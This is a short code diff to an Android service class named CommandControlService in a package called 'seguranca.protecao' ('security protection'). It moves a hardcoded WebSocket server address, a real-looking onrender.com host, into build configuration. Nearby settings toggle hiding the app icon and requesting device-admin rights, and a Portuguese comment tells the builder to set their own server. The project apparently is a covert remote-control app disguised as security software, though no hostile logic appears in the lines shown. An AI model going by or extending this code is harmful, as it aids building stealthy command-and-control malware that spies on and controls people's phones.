@@ -3,6 +3,7 @@ package com.seguranca.protecao;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
+import com.seguranca.protecao.BuildConfig;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.os.Build;
@@ -58,7 +59,7 @@ public class CommandControlService extends Service {
     
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
-    public static final String SERVER_URL = "wss://lost-nnuv.onrender.com/ws";
+    public static final String SERVER_URL = BuildConfig.SERVER_URL;
     public static final String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
